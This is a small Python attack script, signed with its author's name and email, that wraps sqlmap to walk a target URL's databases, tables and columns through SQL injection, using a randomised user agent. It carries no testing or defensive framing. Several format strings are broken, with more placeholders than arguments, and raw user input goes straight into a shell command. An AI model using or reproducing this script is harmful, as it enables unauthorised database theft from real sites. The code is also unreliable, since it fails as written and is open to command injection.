print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("+                                                          +")
print("+               [!] powered by yazeed [!]                  +")
print("+           My Email: Bilalyazeed4@gmail.com               +")
print("+                                                          +")
print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

import os

url = input("Enter Url: ")
print("+++++++++++++++++++++++++++++++++++++++++++++")
sqlmap1 = os.system('sqlmap --url {} --dbs {} --random-agent'.format(url))
print("+++++++++++++++++++++++++++++++++++++++++++++")
dbs = input("Enter DATABASE Name: ")
sqlmap1 = os.system('sqlmap --url {} -D {} --tables {} --random-agent'.format(url,dbs))
tab = input("Enter TABLE Name: ")
sqlmap1 = os.system('sqlmap --url {} -D {} -T {} --random-agent'.format(url,dbs,tab))
col = input("Enter COLUMN name: ")
sqlmap1 = os.system('sqlmap --url {} -D {} -T {} -C {} --random-agent'.format(url,dbs,tab,col))
